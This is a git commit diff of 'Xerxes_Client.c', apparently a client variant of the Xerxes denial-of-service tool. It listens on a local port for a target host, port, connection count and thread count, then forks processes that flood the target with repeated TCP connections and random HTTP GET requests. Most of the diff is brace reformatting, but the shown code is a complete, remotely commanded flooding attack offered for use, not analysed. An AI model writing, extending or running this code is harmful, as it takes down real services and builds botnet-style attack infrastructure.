16663f508ea5565822bafda85bdea6a6bb329d81
lpfan4ever <dominik.francan@hotmail.com>
2017-07-18 20:38:53 +0200

    Client Version

--- Xerxes_Client.c
+++ Xerxes_Client.c
@@ -18,7 +18,8 @@ int Connections = 0;
 char hostd[16];
 char portd[16];
 
-int make_socket(char *host, char *port) {
+int make_socket(char *host, char *port) 
+{
 	struct addrinfo hints, *servinfo, *p;
 	int sock, r;
 
@@ -26,21 +27,24 @@ int make_socket(char *host, char *port) {
 	hints.ai_family = AF_UNSPEC;
 	hints.ai_socktype = SOCK_STREAM;//TCP
 
-	if((r=getaddrinfo(host, port, &hints, &servinfo))!=0) {
+	if((r=getaddrinfo(host, port, &hints, &servinfo))!=0)
+	{ 
 		fprintf(stderr, "getaddrinfo: %s\n", gai_strerror(r));
 		exit(0);
 	}
-	for(p = servinfo; p != NULL; p = p->ai_next) {
-		if((sock = socket(p->ai_family, p->ai_socktype, p->ai_protocol)) == -1) {
+	for(p = servinfo; p != NULL; p = p->ai_next) 
+	{
+		if((sock = socket(p->ai_family, p->ai_socktype, p->ai_protocol)) == -1)
 			continue;
-		}
-		if(connect(sock, p->ai_addr, p->ai_addrlen)==-1) {
+		if(connect(sock, p->ai_addr, p->ai_addrlen)==-1) 
+		{
 			close(sock);
 			continue;
 		}
 		break;
 	}
-	if(p == NULL) {
+	if(p == NULL) 
+	{
 		if(servinfo)
 			freeaddrinfo(servinfo);
 		fprintf(stderr, "No connection could be made\n");
@@ -52,11 +56,13 @@ int make_socket(char *host, char *port) {
 	return sock;
 }
 
-void broke(int s) {
+void broke(int s) 
+{
 	// do nothing
 }
 
-void attack(char *host, char *port, int id) {
+void attack(char *host, char *port, int id) 
+{
 	int sockets[Connections];
 	int x, r, i, n, buf;
 	char string[10];
@@ -69,19 +75,20 @@ void attack(char *host, char *port, int id) {
 
 	signal(SIGPIPE, &broke);
 
-	while(1) {
-		for(x=0; x != Connections; x++) {
+	while(1) 
+	{
+		for(x=0; x != Connections; x++) 
+		{
 			if(sockets[x] == 0)
 				sockets[x] = make_socket(host, port);
     
-	srand(time(NULL));
-	for( j = 0; j < 9; j++){
-        string[j] = 'A' + rand()%26; // starting on 'A', ending on 'Z'	
-	}
+			srand(time(NULL));
+			for( j = 0; j < 9; j++)
+       			string[j] = 'A' + rand()%26; // starting on 'A', ending on 'Z'	
 	
-	sprintf(httpbuf, "GET /%s HTTP/1.0\r\n\r\n", string);
-	strncpy(s_copy, httpbuf, sizeof(s_copy));
-	int sizebuf = sizeof s_copy - 1;
+			sprintf(httpbuf, "GET /%s HTTP/1.0\r\n\r\n", string);
+			strncpy(s_copy, httpbuf, sizeof(s_copy));
+			int sizebuf = sizeof s_copy - 1;
 			r=write(sockets[x], s_copy, sizebuf);
 			close(sockets[x]);
 			sockets[x] = make_socket(host, port);
@@ -91,7 +98,8 @@ void attack(char *host, char *port, int id) {
 	}
 }
 //Modify this function
-int create_socket(char *host, char *port) {
+int create_socket(char *host, char *port) 
+{
 	int socket_desc , client_sock , c , read_size, x;
     struct sockaddr_in server , client;
     char client_message[16];
@@ -139,25 +147,26 @@ int create_socket(char *host, char *port) {
     //Receive a message from client
     while( (read_size = recv(client_sock , client_message , 16 , 0)) > 0 )
     {
-		if(j == 0) {
+		if(j == 0) 
+		{
 			strncpy(hostd,client_message,strlen(client_message)-2);
-		for(int i = 0; i <= 16; i++) {
-			client_message[i] = '\0';
+			for(int i = 0; i <= 16; i++)
+				client_message[i] = '\0';
 		}
-		}
-		if(j == 1) {
+		if(j == 1) 
+		{
 			strncpy(portd,client_message,strlen(client_message)-2);
-		for(int i = 0; i <= 16; i++) {
-			client_message[i] = '\0';
+			for(int i = 0; i <= 16; i++)
+				client_message[i] = '\0';
 		}
-		}
-		if(j == 2) {
+		if(j == 2) 
+		{
 			Connections = atoi(client_message);
-		for(int i = 0; i <= 16; i++) {
-			client_message[i] = '\0';
+			for(int i = 0; i <= 16; i++) 
+				client_message[i] = '\0';
 		}
-		}
-		if(j == 3) {
+		if(j == 3) 
+		{
 			Threads = atoi(client_message);
 		}
 		j++;
@@ -165,14 +174,16 @@ int create_socket(char *host, char *port) {
 			break;
     }
 
-    for(x=0; x != Threads; ++x) {
+    for(x=0; x != Threads; ++x) 
+	{
 		if(fork())
 			attack(hostd, portd, x);
 		usleep(200000);
 	}
     return 0;
 }
-int main(int argc, char **argv) {
+int main(int argc, char **argv) 
+{
 	int socket;
 
 	socket = create_socket("localhost", "60134");
